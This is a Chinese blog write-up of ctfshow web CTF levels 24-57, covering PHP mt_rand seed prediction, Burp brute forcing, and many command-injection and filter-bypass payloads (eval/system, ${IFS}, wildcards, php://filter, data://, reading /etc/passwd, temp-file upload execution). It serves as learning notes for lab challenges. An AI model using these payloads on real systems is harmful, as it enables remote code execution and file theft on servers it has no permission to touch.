<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line"></span><br><span class="line">  mt_srand(372619038);</span><br><span class="line"></span><br><span class="line">  echo intval(mt_rand());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到的数字1155388967就可以拿到flag</p>
<p>ctfshow{dddab7e5-2562-455d-9156-17542fe2507a}</p>
<h1><strong>Web25</strong></h1>
<p>$rand = intval($r)-intval(mt_rand());</p>
<p>当r=0时</p>
<p>Rand=-448251818</p>
<p>那么，mt_rand=448251818</p>
<p>这里需要反推出seed，下载php_mt_seed，拖进去ubuntu。对了，还需要php的版本，我们抓包看看响应头  PHP/7.3.11</p>
<p>在ubuntu运行脚本查看seed：928309670或者4126709391</p>
<p>在这里面运行（后一个seed正确）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
<p>得</p>
<p>448251818</p>
<p>614468087</p>
<p>Url/r=448251818  cookie=token=614468087</p>
<p>ctfshow{3944ae31-389f-4695-92fb-7791162db256}</p>
<h1><strong>Web26</strong></h1>
<p>进去之后是个下载的什么什么的东西</p>
<p>还有账号密码，应该是破解密码的</p>
<p>Bp抓包爆破7758521</p>
<p>ctfshow{9a82e93f-9eea-4340-8754-e2a1559f75cf</p>
<h1><strong>Web27</strong></h1>
<p>点击录取名单，有一个表格，那就从第一个人下手</p>
<p>高先伊621022********5237</p>
<p>很明显，这里需要bp暴力破解，注意抓post包</p>
<p>发送给intruder</p>
<p><img src="/2025/01/19/web21-30/wps24.jpg" alt="img"></p>
<p><img src="/2025/01/19/web21-30/wps25.jpg" alt="img"></p>
<p><img src="/2025/01/19/web21-30/wps26.jpg" alt="img"></p>
<p>02015237</p>
<p>621022199002015237</p>
<p>ctfshow{45f62eec-3f98-4f37-a99e-2e564ac70f4f}</p>
<h1><strong>Web28</strong></h1>
<p>爆破目录</p>
<p><img src="/2025/01/19/web21-30/wps27.jpg" alt="img"></p>
<p>换成集束炸弹模式，选中1 2，并把后面的2.txt删掉，右边1和2都从0到100，出来后点状态码，然后点响应就可以了</p>
<p><img src="/2025/01/19/web21-30/wps28.jpg" alt="img"></p>
<p>ctfshow{d70041f1-624c-4a40-88ae-1a720cbb9e35}</p>
<h1>Web29</h1>
<p><img src="/2025/01/19/web21-30/wps29.jpg" alt="img"></p>
<p>解释代码：</p>
<p>error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)，即不显示 PHP 运行过程中可能产生的错误信息。这样做可能是为了避免在某些情况下向用户暴露敏感信息，但在开发和调试阶段，通常不建议关闭错误报告，以便及时发现和解决问题。</p>
<p>if(isset($_GET[‘c’])){：isset()函数用于检查变量是否已设置且非null。这里是检查$_GET超全局数组中是否存在键为’c’的元素。如果存在，就执行下面的代码块。</p>
<p>$c = $_GET[‘c’];：将$_GET[‘c’]的值赋给变量$c，以便后续使用。</p>
<p>if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配。这里的正则表达式&quot;/flag/i&quot;表示不区分大小写地匹配字符串&quot;flag&quot;。!表示取反，即如果$c的值不包含（不区分大小写）“flag”，则执行下面的eval($c);语句。</p>
<p>eval($c);：eval()函数会将传入的字符串作为 PHP 代码执行。这是一个非常强大但也很危险的函数，因为如果传入的字符串来自不可信的来源（例如用户输入），可能会导致安全漏洞，如代码注入攻击。</p>
<p>总的来说：我们需要get一个命令，让它出现flag。然而，他又过滤了flag这四个字符，那怎么办？</p>
<p>\1. 使用Linux通配符，我们可以这样构造payload：?c=system(‘cat f*’);或者?c=system(‘cat [f]*’);然后查看源码得到flag，或者抓包看到flag</p>
<p>\2. ?c=system(“cat *.php&gt;&gt;1.txt”);把所有以php结尾的文件都写进一个txt</p>
<p>ctfshow{cd997bb9-1ab7-48a7-819a-c5e9856aedc3}</p>
<p>插入一点知识:</p>
<p>\1.  ?c=phpinfo();当中的disable_functions</p>
<p><img src="/2025/01/19/web21-30/wps30.jpg" alt="img"></p>
<p>后面没有任何的值，也就是说，这里没有禁用任何的函数。那么我们就可以使用system函数来输出flag</p>
<p>\2.  ?c=system(‘ls’);看到有flag.php和index.php两个文件，那么我们想一想，能不能单独显示出来flag.php，然后前面加上一个cat？</p>
<p>scandir(“.”)扫描当前目录，但没有回显</p>
<p>套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
<p>那么，有了flag.php这个整体，那前面拼接一个cat是不是就可以了？</p>
<p>知识有限，止步于此</p>
<h1>Web30</h1>
<p>shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令</p>
<p>反引号和shell_exec()函数同理</p>
<p>?c=echo <code>cat f*</code>;看源码出flag</p>
<p>?c=passthru(‘cat f*’);</p>
<p>这里呢？哈哈哈哈，卢本伟：**</p>
<p>万能办法&gt;&gt;和cp(复制，和&gt;&gt;差不多)用法cp flag.php 1.txt</p>
<p>?c=echo <code>cat [f]*</code>;注意看源代码，你看你的软件，肯定没回显的</p>
<p>?c=echo <code>cat [f]* &gt;&gt; 1.txt</code>;</p>
<p>ctfshow{e6cce2cc-a5dc-4e88-ba65-3cc8d4620046}</p>
<h1>总结21-30</h1>
<p>1.bp当中的intruder为爆破部分</p>
<p>2.自定义迭代器(Custom Iterator):可以自动替换测试，而且可以添加前后缀，结果可以通过base64等加密一下</p>
<p>3.特定字符串内容一般abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789其中几个字符组成的，可以通过编写脚本得出需要的特定字符串</p>
<p>4.伪随机数mt_srand()和mt_srand(seed);产生的随机数是固定的。seed为数字串</p>
<p>5.intruder 当中有集束炸弹模式，可以选中多个部分进行爆破</p>
<p>6.if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配</p>
<p>7.isset()函数用于检查变量是否已设置且非null。if(isset($_GET[‘c’])){</p>
<p>8.eval()函数会将传入的字符串作为 PHP 代码执行</p>
<p>9.error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)</p>
<p>10.Linux通配符:  cat * [] {} ?</p>
<p>11.phpinfo();当中的disable_functions后面跟的值是禁用的函数</p>
<p>12.?c=system(“cat *.php&gt;&gt;1.txt”);把所有php的内容写到txt里面</p>
<p>13.scandir(“.”)表示扫描当前目录，一个点是当前目录，两个点是上级目录.套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
<p>那在前面拼接一个cat是不是可以拿到flag？</p>
<p>14.shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令.反引号和shell_exec()函数同理</p>
<ol start="15">
<li>?c=passthru(‘cat f*’);</li>
</ol>
<p>​		?c=echo cat [f]*;注意看源代码，你看你的软件，肯定没回显的</p>
<p>​		?c=echo cat [f]* &gt;&gt; 1.txt;</p>
<p>16.?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
<p>代码解释：从get当中获取了一个超全局变量a，并使用eval函数将其作为php代码执行</p>
<p>通过a来拿到flag，但这里似乎是在preg_match外运行的，不会受过滤的影响</p>
<p>$符号可以类比java当中的int</p>
<ol start="17">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格绕过</span><br><span class="line"></span><br><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<ol start="18">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat过滤</span><br><span class="line"></span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<p>19…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php无需括号的函数</span><br><span class="line"></span><br><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
<p>20.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web31-命令执行结束</title>
    <url>/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/</url>
    <content><![CDATA[<h1>Web31</h1>
<p>?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/wps1.jpg" alt="img"></p>
<p>我们相当于在if这个条件里面添加了一个新的参数a，然后通过这个参数a进行操作</p>
<p>理解过程，我们先传进去了?c=eval($_GET[a]);，这串代码成功地执行了，并且跳出了if和else函数，然后在调用参数a，&amp;a=system(‘cat flag.php’);</p>
<p>各种payload：</p>
<p>?c=echo(<code>tac%09f*</code>);</p>
<p>?c=echo(<code>tail%09f*</code>);</p>
<p>需要查看源码：</p>
<p>?c=echo(<code>nl%09f*</code>);</p>
<p>?c=echo(<code>less%09f*</code>);</p>
<p>?c=echo(<code>more%09f*</code>);</p>
<p>…</p>
<p>见下绕过方法</p>
<p>ctfshow{15b00389-8276-40c6-a865-92ae407d30e4}</p>
<p>空格绕过</p>
<p>%09 符号需要php环境</p>
<p>{cat,flag.txt}</p>
<p>cat${IFS}flag.txt</p>
<p>cat$IFS$9flag.txt</p>
<p>cat&lt;flag.txt</p>
<p>cat&lt;&gt;flag.txt</p>
<p>kg=$‘\x20flag.txt’&amp;&amp;cat$kg</p>
<p>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
<p>cat过滤</p>
<p>more:一页一页的显示档案内容</p>
<p>less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</p>
<p>head:查看头几行</p>
<p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
<p>tail:查看尾几行</p>
<p>nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</p>
<p>od:以二进制的方式读取档案内容</p>
<p>vi:一种编辑器，这个也可以查看</p>
<p>vim:一种编辑器，这个也可以查看</p>
<p>sort:可以查看</p>
<p>uniq:可以查看</p>
<p>file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</p>
<p>来源：<a href="https://blog.csdn.net/qq_49480008/article/details/113177878">https://blog.csdn.net/qq_49480008/article/details/113177878</a></p>
<p>Web32</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=system(‘cat flag.php’);</p>
<p>%0a是换行符url编码</p>
<p>include是 PHP 中的一个语句，用于将指定文件包含到当前 PHP 文件中</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=flag.php</p>
<p>这个由于前面没有分号，不能正常输出</p>
<p>最终正确payload：</p>
<p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者：</p>
<p>?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>%0a和&quot;&quot;的区别还需考量</p>
<p>文件包含，可以直接用插件写，后面加上文件，最后解码</p>
<p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7NDg3MjQ5NmUtNDdkYy00M2E3LTkyYzItZDJmNjRhMzQxNjU3fSI7DQo</p>
<p>ctfshow{4872496e-47dc-43a7-92c2-d2f64a341657}</p>
<p>php无需括号的函数</p>
<p>echo 123;</p>
<p>print 123;</p>
<p>die;</p>
<p>include “/etc/passwd”;</p>
<p>require “/etc/passwd”;</p>
<p>include_once “/etc/passwd”;</p>
<p>require_once “etc/passwd”;</p>
<h1>Web33</h1>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{9e4bb5c3-42bd-4f47-be4b-eb8cd78f7319}</p>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>和</p>
<p>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>的区别是：有引号，优先执行</p>
<h1>Web34</h1>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{e5e97ce9-f824-476c-bb46-97fd0fa94d55}</p>
<h1>Web35</h1>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{c0c4ecbe-0caf-4c5a-969b-1db575e377d1}</p>
<p>Web36</p>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>ctfshow{5dc7f14c-82ab-419a-8a07-54f76fbcee7b}</p>
<p>Web37</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/wps2.jpg" alt="img"></p>
<p>他在里面又套了一个include，并且过滤了flag</p>
<p>那我们的</p>
<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</p>
<p>就失效了</p>
<p>新方法：</p>
<p>?c=data://text/plain,<?php system('cat fla*');?></p>
<p>ctfshow{0b8aa5cc-30a5-48bc-89e6-eca36f2c77bd}</p>
<p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
<p>伪协议的一种</p>
<h1>Web38</h1>
<p>题目里面过滤了php，所以?c=data://text/plain,<?php system('cat fla*');?>就不行了，因为里面有php，我们可以把php换成等号=，短标签</p>
<p>?c=data://text/plain,<?= system('cat fla*');?></p>
<p>另外一个办法</p>
<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCAiKTs/Pg==      //<?php system("nl flag.php ");?></p>
<p>Tac和ni都可以但是cat就不行，为啥，</p>
<p>ctfshow{76f2194a-afc2-40bd-b338-9010ea69bbe3}</p>
<h1>Web39</h1>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/wps3.jpg" alt="img"></p>
<p>他在后面又加了一个.php没有用，因为我们已经用?&gt;合并了php代码</p>
<p>?c=data://text/plain,<?php system('cat fla?.php'); ?></p>
<p>他在后面加了.php那后面应该会报错，但是不影响我们拿flag</p>
<p>ctfshow{20616819-94c2-4f03-b3a8-d8bc1cb4042d}</p>
<h1>Web40</h1>
<p>函数 localeconv() 会返回一个包含本地环境信息的数组</p>
<p>pos()和 current()是等价的函数，它们会返回数组的当前元素</p>
<p>对于 localeconv()函数返回的数组，使用 pos(localeconv()) 通常会返回该数组的第一个元素的值，如果这个元素是点则返回点，如果是flag则返回flag</p>
<p>scandir()函数用于扫描指定目录的文件和目录，由于 pos(localeconv()) 可能返回 点，所以 scandir(pos(localeconv())) 等价于scandir(“.”)。</p>
<p>scandir(“.”)会返回一个包含当前目录下所有文件和目录名称的数组</p>
<p>array_reverse()函数将数组中的元素顺序反转。例如，对于 array(‘.’, ‘…’, ‘index.php’, ‘config.php’, ‘images’)，会变成 array(‘images’, ‘config.php’, ‘index.php’, ‘…’, ‘.’)。</p>
<p>next()函数将数组的内部指针向前移动一个位置，并返回新位置的元素。</p>
<p>对于 array_reverse(scandir(pos(localeconv()))) 结果，它会跳过第一个元素（例如 images），返回下一个元素（例如 config.php）。</p>
<p>show_source() 函数用于显示指定 PHP 文件的源代码，会高亮显示文件内容。</p>
<p>最终</p>
<p>payload?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
<p>ctfshow{231f7098-5080-450c-9cb1-454610f590e7}</p>
<p>另一种方法，但好像不可以拿到flag</p>
<p>c=session_start();system(session_id());</p>
<p>Cookie=PHPSESSID=ls</p>
<h1>web41</h1>
<p>这道题没得说</p>
<p><a href="https://www.bilibili.com/video/BV1jy4y1a7Ew/?p=13&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1jy4y1a7Ew/?p=13&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></p>
<p>真服了，字母数字都禁了。还要脚本</p>
<h1>web42</h1>
<p><strong>&gt;/dev/null 2&gt;&amp;1</strong></p>
<p><strong>可以将/dev/null看作&quot;黑洞&quot;. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong></p>
<p>2和1与错误输出和标准输入有关</p>
<p>总之就是不进行回显</p>
<p>那么题目里面又给了一个sys，并在里面把我们的回显给噶了</p>
<p>那么我们在一个sys里面能否执行多个指令？</p>
<p>这就需要命令分割了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
<p>?c=cat flag.php ||</p>
<p>?c=cat flag.php ;</p>
<p>使用&amp;&amp;或者&amp;也可以，但是要对其进行url编码</p>
<p>?c=tac flag.php %26%26</p>
<p>ctfshow{631405df-72b0-4dab-aa64-f95c49f4924a}</p>
<h1>web43</h1>
<p>没有过滤||</p>
<p>?c=tac flag.php ||</p>
<p>ctfshow{d4f5849a-36c4-4026-a1b4-a2fed591d86a}</p>
<h1>web44</h1>
<p>cat绕过+通配符+命令分隔</p>
<p>?c=tac fl* ||</p>
<p>ctfshow{28d36c8d-f2cf-4c1d-bc7f-33d2270a8dd3}</p>
<h1>web45</h1>
<p>cat、空格绕过+通配符+命令分隔</p>
<p>这里tac也不行了</p>
<p>这里空格过滤指过滤了“ ”和“%20”</p>
<p>?c=nl%09fla*||</p>
<p>ctfshow{0d3c9cea-3c56-4439-b8cd-bf30b77b3b3f}</p>
<h1>web46</h1>
<p>过滤了数字，但是%09不属于数字</p>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{44400151-8bf6-4fe7-b2f1-647b96b0b8a8}</p>
<h1>web47</h1>
<p>/?c=nl%09fla?.php||</p>
<p>ctfshow{98523018-46d3-48c2-8baa-b4043f0ebf07}</p>
<h1>web48</h1>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{d022aafe-76da-4be9-867e-88322ce50ef9}</p>
<h1>web49</h1>
<p>?c=tac%09fla?.php||</p>
<p>ctfshow{89335b6d-8017-4792-a711-61a8b40d5ba9}</p>
<h1>web50</h1>
<p>&lt;&gt;与html编程有关，好像这里加一个这个可以弄出来一个空格</p>
<p>反斜杠\是转义字符。在 <code>fla\g.php</code> 中，可能是试图将 <code>g</code> 转义，使得 <code>fla\g.php</code> 不会被当作一个整体，而被解释为 <code>fla</code> 和 <code>g.php</code></p>
<p>''也没有什么含义，就是绕过了flag过滤</p>
<p>?c=tac&lt;&gt;fla\g.php||</p>
<p>?c=tac&lt;&gt;fla’'g.php||</p>
<p>ctfshow{e6f38678-4786-4b07-8c0c-c0afeb267603}</p>
<h1>web51</h1>
<p>题目把tac噶了</p>
<p>?c=nl&lt;&gt;fla’'g.php||</p>
<p>ctfshow{e43bd801-f9f9-4c0a-a0b8-235be559465b}</p>
<h1>web52</h1>
<p>?c=nl${IFS}fla’'g.php||</p>
<p>flag竟然是假的</p>
<p>看看根目录</p>
<p>?c=ls${IFS}/||</p>
<p>看到flag</p>
<p>?c=nl${IFS}/flag||</p>
<p>ctfshow{679e044a-5050-4f3b-847f-df73a21e1399}</p>
<h1>web53</h1>
<p>这里题目变了</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/image-20250122001017484.png" alt="image-20250122001017484"></p>
<p>?c=nl${IFS}fla\g.php</p>
<p>ctfshow{321965b6-59b8-4416-93b4-2d92b628f457}</p>
<h1>web54</h1>
<p>grep test *file   在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<p>?c=grep${IFS}%27{ %27${IFS}fl???php</p>
<p>意思就是在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行</p>
<p>?c=mv${IFS}fla?.php${IFS}b.txt</p>
<p>使用mv时，flag.php将会被删除</p>
<p>进入/b.txt</p>
<p>ctfshow{49f89c5e-7c29-4adf-9077-e1ad0993f5ad}</p>
<h1>web55</h1>
<p>这题目真骚，payload更骚</p>
<p>?c=/???/???64%20???.???</p>
<table>
<thead>
<tr>
<th>**bin目录:**bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</th>
</tr>
</thead>
</table>
<p>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</p>
<p>羽大佬的WP还有一种解法</p>
<p>如下：payload：?c=/???/???/???2 ???.??? 然后在url + /flag.php.bz2</p>
<table>
<thead>
<tr>
<th>/usr/bin目录:主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</th>
</tr>
</thead>
</table>
<p>我们可以利用/usr/bin下的<strong>bzip2</strong></p>
<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
<p>ctfshow{1a3616a8-6ae4-4951-a6b3-5f0631c6279c}</p>
<h1>web56</h1>
<p>新知识，无post上传文件，我们可以创建窗口上传文件来运行脚本拿到flag</p>
<p>造一个post上传文件的数据包</p>
<p>在桌面创建post.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://08f987d7-d95f-4f18-a2ab-5d9915f7349f.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再创建文件1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>shell程序必须以&quot;#!/bin/sh&quot;开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
<p>打开post.html（注意里面的链接改为题目的链接）</p>
<p>上传1.php</p>
<p>用bp抓包</p>
<p>严格按照图片的格式，好像是不等多一行，空白也不行。</p>
<p>然后发送多次，就可以了</p>
<p>之后改成cat flag.php就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[</span><br></pre></td></tr></table></figure>
<p>1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/image-20250121181036702.png" alt="image-20250121181036702"></p>
<p>ctfshow{a3f7bc05-69a7-40af-9510-22fa6996596</p>
<h1>web57</h1>
<p>flag在36.php，并且在sys里面已经把命令和后缀给我们了，直接搞出来36就行了</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/image-20250121194051599.png" alt="image-20250121194051599"></p>
<p><em><strong>算术扩展（Arithmetic Expansion）运算</strong></em></p>
